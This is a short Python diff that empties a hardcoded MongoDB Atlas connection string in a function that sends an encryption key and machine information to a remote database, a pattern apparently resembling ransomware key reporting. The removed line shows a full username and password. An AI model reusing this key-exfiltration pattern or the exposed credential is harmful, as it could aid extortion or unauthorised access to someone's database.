@@ -37,7 +37,7 @@ def get_machine_info():
 
 def send_encryption_key_to_atlas(encryption_key):
     """Send encryption key and machine info to MongoDB Atlas using pymongo."""
-    uri = "mongodb+srv://gaourangbaria1002:rgAG1ac59Bvj28Wy@cluster0.jwx8zgp.mongodb.net/?retryWrites=true&w=majority&appName=Cluster00"
+    uri = ""
 
     client = MongoClient(uri, server_api=ServerApi('1'))
 
